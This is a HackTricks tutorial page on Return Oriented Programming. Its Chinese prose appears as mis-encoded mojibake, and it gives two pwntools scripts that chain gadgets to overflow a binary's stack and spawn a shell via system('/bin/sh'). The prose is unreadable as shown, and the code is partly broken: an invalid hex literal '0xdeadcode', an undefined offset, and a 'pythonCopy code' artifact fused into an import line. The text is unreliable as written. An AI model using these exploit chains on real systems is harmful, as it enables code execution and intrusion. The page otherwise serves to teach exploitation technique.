# ROP - Return Oriented Programing

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

**è¿”å›å¯¼å‘ç¼–ç¨‹ï¼ˆROPï¼‰**æ˜¯ä¸€ç§é«˜çº§åˆ©ç”¨æŠ€æœ¯ï¼Œç”¨äºè§„é¿è¯¸å¦‚**ä¸å¯æ‰§è¡Œï¼ˆNXï¼‰**æˆ–**æ•°æ®æ‰§è¡Œé˜²æŠ¤ï¼ˆDEPï¼‰**ä¹‹ç±»çš„å®‰å…¨æªæ–½ã€‚æ”»å‡»è€…ä¸æ˜¯æ³¨å…¥å’Œæ‰§è¡Œshellcodeï¼Œè€Œæ˜¯åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æˆ–åŠ è½½çš„åº“ä¸­å·²ç»å­˜åœ¨çš„ä»£ç ç‰‡æ®µï¼Œç§°ä¸º**â€œgadgetsâ€**ã€‚æ¯ä¸ªgadgeté€šå¸¸ä»¥`ret`æŒ‡ä»¤ç»“å°¾ï¼Œå¹¶æ‰§è¡Œå°æ“ä½œï¼Œä¾‹å¦‚åœ¨å¯„å­˜å™¨ä¹‹é—´ç§»åŠ¨æ•°æ®æˆ–æ‰§è¡Œç®—æœ¯æ“ä½œã€‚é€šè¿‡é“¾æ¥è¿™äº›gadgetsï¼Œæ”»å‡»è€…å¯ä»¥æ„å»ºæœ‰æ•ˆç»•è¿‡NX/DEPä¿æŠ¤æ‰§è¡Œä»»æ„æ“ä½œçš„æœ‰æ•ˆè½½è·ã€‚

### ROPçš„å·¥ä½œåŸç†

1. **æ§åˆ¶æµåŠ«æŒ**ï¼šé¦–å…ˆï¼Œæ”»å‡»è€…éœ€è¦åŠ«æŒç¨‹åºçš„æ§åˆ¶æµï¼Œé€šå¸¸æ˜¯é€šè¿‡åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¥è¦†ç›–æ ˆä¸Šä¿å­˜çš„è¿”å›åœ°å€ã€‚
2. **Gadgeté“¾æ¥**ï¼šç„¶åï¼Œæ”»å‡»è€…ä»”ç»†é€‰æ‹©å’Œé“¾æ¥gadgetsä»¥æ‰§è¡Œæ‰€éœ€çš„æ“ä½œã€‚è¿™å¯èƒ½æ¶‰åŠä¸ºå‡½æ•°è°ƒç”¨è®¾ç½®å‚æ•°ï¼Œè°ƒç”¨å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œ`system("/bin/sh")`ï¼‰ï¼Œä»¥åŠå¤„ç†ä»»ä½•å¿…è¦çš„æ¸…ç†æˆ–é™„åŠ æ“ä½œã€‚
3. **æœ‰æ•ˆè½½è·æ‰§è¡Œ**ï¼šå½“æ˜“å—æ”»å‡»çš„å‡½æ•°è¿”å›æ—¶ï¼Œå®ƒä¸æ˜¯è¿”å›åˆ°åˆæ³•ä½ç½®ï¼Œè€Œæ˜¯å¼€å§‹æ‰§è¡Œgadgetsé“¾ã€‚

## x86ç¤ºä¾‹ä¸­çš„ROPé“¾

### **x86ï¼ˆ32ä½ï¼‰è°ƒç”¨çº¦å®š**

- **cdecl**ï¼šè°ƒç”¨è€…æ¸…ç†å †æ ˆã€‚å‡½æ•°å‚æ•°ä»¥ç›¸åé¡ºåºï¼ˆä»å³åˆ°å·¦ï¼‰æ¨é€åˆ°å †æ ˆä¸Šã€‚**å‚æ•°ä»å³åˆ°å·¦æ¨é€åˆ°å †æ ˆä¸Š**ã€‚
- **stdcall**ï¼šç±»ä¼¼äºcdeclï¼Œä½†è¢«è°ƒç”¨æ–¹è´Ÿè´£æ¸…ç†å †æ ˆã€‚

### **æŸ¥æ‰¾Gadgets**

é¦–å…ˆï¼Œè®©æˆ‘ä»¬å‡è®¾æˆ‘ä»¬å·²ç»åœ¨äºŒè¿›åˆ¶æ–‡ä»¶æˆ–å…¶åŠ è½½çš„åº“ä¸­è¯†åˆ«å‡ºå¿…è¦çš„gadgetsã€‚æˆ‘ä»¬æ„Ÿå…´è¶£çš„gadgetsåŒ…æ‹¬ï¼š

- `pop eax; ret`ï¼šæ­¤gadgetå°†å †æ ˆé¡¶éƒ¨çš„å€¼å¼¹å‡ºåˆ°`EAX`å¯„å­˜å™¨ä¸­ï¼Œç„¶åè¿”å›ï¼Œå…è®¸æˆ‘ä»¬æ§åˆ¶`EAX`ã€‚
- `pop ebx; ret`ï¼šç±»ä¼¼äºä¸Šè¿°ï¼Œä½†ç”¨äº`EBX`å¯„å­˜å™¨ï¼Œä½¿å¾—å¯ä»¥æ§åˆ¶`EBX`ã€‚
- `mov [ebx], eax; ret`ï¼šå°†`EAX`ä¸­çš„å€¼ç§»åŠ¨åˆ°ç”±`EBX`æŒ‡å‘çš„å†…å­˜ä½ç½®ï¼Œç„¶åè¿”å›ã€‚
- æ­¤å¤–ï¼Œæˆ‘ä»¬æœ‰`system()`å‡½æ•°çš„åœ°å€å¯ç”¨ã€‚

### **ROPé“¾**

ä½¿ç”¨**pwntools**ï¼Œæˆ‘ä»¬ä¸ºROPé“¾æ‰§è¡Œå‡†å¤‡å †æ ˆï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œæ—¨åœ¨æ‰§è¡Œ`system('/bin/sh')`ï¼Œè¯·æ³¨æ„é“¾ä»ä»¥ä¸‹å¼€å§‹ï¼š

1. ç”¨äºå¯¹é½ç›®çš„çš„`ret`æŒ‡ä»¤ï¼ˆå¯é€‰ï¼‰
2. `system`å‡½æ•°çš„åœ°å€ï¼ˆå‡è®¾ASLRå·²ç¦ç”¨ä¸”å·²çŸ¥libcï¼Œæ›´å¤šä¿¡æ¯è¯·å‚é˜…[**Ret2lib**](ret2lib/)ï¼‰
3. æ¥è‡ª`system()`çš„è¿”å›åœ°å€çš„å ä½ç¬¦
4. `"/bin/sh"`å­—ç¬¦ä¸²åœ°å€ï¼ˆsystemå‡½æ•°çš„å‚æ•°ï¼‰
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## x64ä¸­çš„ROPé“¾ç¤ºä¾‹

### **x64ï¼ˆ64ä½ï¼‰è°ƒç”¨çº¦å®š**

* åœ¨ç±»Unixç³»ç»Ÿä¸Šä½¿ç”¨ **System V AMD64 ABI** è°ƒç”¨çº¦å®šï¼Œå…¶ä¸­ **å‰å…­ä¸ªæ•´æ•°æˆ–æŒ‡é’ˆå‚æ•°é€šè¿‡å¯„å­˜å™¨ `RDI`ã€`RSI`ã€`RDX`ã€`RCX`ã€`R8` å’Œ `R9` ä¼ é€’**ã€‚é¢å¤–çš„å‚æ•°é€šè¿‡å †æ ˆä¼ é€’ã€‚è¿”å›å€¼æ”¾åœ¨ `RAX` ä¸­ã€‚
* **Windows x64** è°ƒç”¨çº¦å®šä½¿ç”¨ `RCX`ã€`RDX`ã€`R8` å’Œ `R9` ä½œä¸ºå‰å››ä¸ªæ•´æ•°æˆ–æŒ‡é’ˆå‚æ•°ï¼Œé¢å¤–çš„å‚æ•°é€šè¿‡å †æ ˆä¼ é€’ã€‚è¿”å›å€¼æ”¾åœ¨ `RAX` ä¸­ã€‚
* **å¯„å­˜å™¨**ï¼š64ä½å¯„å­˜å™¨åŒ…æ‹¬ `RAX`ã€`RBX`ã€`RCX`ã€`RDX`ã€`RSI`ã€`RDI`ã€`RBP`ã€`RSP` å’Œ `R8` åˆ° `R15`ã€‚

#### **æŸ¥æ‰¾Gadgets**

ä¸ºäº†æˆ‘ä»¬çš„ç›®çš„ï¼Œè®©æˆ‘ä»¬ä¸“æ³¨äºèƒ½å¤Ÿè®¾ç½® **RDI** å¯„å­˜å™¨ï¼ˆå°† **"/bin/sh"** å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’ç»™ **system()**ï¼‰å¹¶è°ƒç”¨ **system()** å‡½æ•°çš„gadgetsã€‚æˆ‘ä»¬å‡è®¾å·²ç»è¯†åˆ«å‡ºä»¥ä¸‹gadgetsï¼š

* **pop rdi; ret**ï¼šå°†å †æ ˆé¡¶éƒ¨çš„å€¼å¼¹å‡ºåˆ° **RDI** ä¸­ï¼Œç„¶åè¿”å›ã€‚ç”¨äºä¸º **system()** è®¾ç½®å‚æ•°è‡³å…³é‡è¦ã€‚
* **ret**ï¼šç®€å•çš„è¿”å›ï¼Œå¯¹äºæŸäº›æƒ…å†µä¸‹çš„å †æ ˆå¯¹é½å¾ˆæœ‰ç”¨ã€‚

æˆ‘ä»¬çŸ¥é“ **system()** å‡½æ•°çš„åœ°å€ã€‚

### **ROPé“¾**

ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ **pwntools** è®¾ç½®å’Œæ‰§è¡ŒROPé“¾çš„ç¤ºä¾‹ï¼Œæ—¨åœ¨åœ¨ **x64** ä¸Šæ‰§è¡Œ **system('/bin/sh')**ï¼š
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### æ ˆå¯¹é½

**x86-64 ABI** ç¡®ä¿åœ¨æ‰§è¡Œ **call æŒ‡ä»¤** æ—¶ **æ ˆæ˜¯ 16 å­—èŠ‚å¯¹é½**ã€‚**LIBC** ä¸ºäº†ä¼˜åŒ–æ€§èƒ½ï¼Œ**ä½¿ç”¨ SSE æŒ‡ä»¤**ï¼ˆå¦‚ **movaps**ï¼‰éœ€è¦è¿™ç§å¯¹é½ã€‚å¦‚æœæ ˆæ²¡æœ‰æ­£ç¡®å¯¹é½ï¼ˆæ„å‘³ç€ **RSP** ä¸æ˜¯ 16 çš„å€æ•°ï¼‰ï¼Œåœ¨ **ROP é“¾** ä¸­è°ƒç”¨ **system** ç­‰å‡½æ•°å°†ä¼šå¤±è´¥ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåœ¨è°ƒç”¨ **system** ä¹‹å‰åœ¨ä½ çš„ ROP é“¾ä¸­æ·»åŠ ä¸€ä¸ª **ret gadget**ã€‚

## x86 ä¸ x64 ä¸»è¦åŒºåˆ«

{% hint style="success" %}
ç”±äº x64 ä½¿ç”¨å¯„å­˜å™¨ä¼ é€’å‰å‡ ä¸ªå‚æ•°ï¼Œå¯¹äºç®€å•çš„å‡½æ•°è°ƒç”¨é€šå¸¸éœ€è¦çš„ gadget è¾ƒå°‘ï¼Œä½†ç”±äºå¯„å­˜å™¨æ•°é‡å¢åŠ å’Œåœ°å€ç©ºé—´è¾ƒå¤§ï¼Œæ‰¾åˆ°å¹¶é“¾æ¥æ­£ç¡®çš„ gadget å¯èƒ½æ›´åŠ å¤æ‚ã€‚**x64** æ¶æ„ä¸­å¯„å­˜å™¨æ•°é‡å¢åŠ å’Œåœ°å€ç©ºé—´è¾ƒå¤§ä¸ºåˆ©ç”¨å¼€å‘æä¾›äº†æœºé‡å’ŒæŒ‘æˆ˜ï¼Œå°¤å…¶æ˜¯åœ¨ Return-Oriented Programmingï¼ˆROPï¼‰çš„èƒŒæ™¯ä¸‹ã€‚
{% endhint %}

## ä¿æŠ¤æœºåˆ¶

* [**ASLR**](../common-binary-protections/aslr.md)
* [**æ ˆä¿æŠ¤**](../common-binary-protections/stack-canaries.md)

## å…¶ä»–ç¤ºä¾‹

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## åŸºäº ROP çš„æŠ€æœ¯

è¯·æ³¨æ„ï¼ŒROP åªæ˜¯ä¸€ç§æ‰§è¡Œä»»æ„ä»£ç çš„æŠ€æœ¯ã€‚åŸºäº ROP å‘å±•å‡ºäº†è®¸å¤š Ret2XXX æŠ€æœ¯ï¼š

* **Ret2lib**ï¼šä½¿ç”¨ ROP ä»åŠ è½½çš„åº“ä¸­è°ƒç”¨å¸¦æœ‰ä»»æ„å‚æ•°çš„ä»»æ„å‡½æ•°ï¼ˆé€šå¸¸ç±»ä¼¼äº `system('/bin/sh')`ï¼‰ã€‚

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**ï¼šä½¿ç”¨ ROP å‡†å¤‡å¯¹ç³»ç»Ÿè°ƒç”¨çš„è°ƒç”¨ï¼Œä¾‹å¦‚ `execve`ï¼Œå¹¶ä½¿å…¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**ï¼šå‰è€…å°†æ»¥ç”¨ EBP è€Œä¸æ˜¯ EIP æ¥æ§åˆ¶æµç¨‹ï¼Œåè€…ç±»ä¼¼äº Ret2libï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµç¨‹ä¸»è¦ç”± EBP åœ°å€æ§åˆ¶ï¼ˆå°½ç®¡ä¹Ÿéœ€è¦æ§åˆ¶ EIPï¼‰ã€‚

{% content-ref url="ebp2ret-ebp-chaining.md" %}
[ebp2ret-ebp-chaining.md](ebp2ret-ebp-chaining.md)
{% endcontent-ref %}
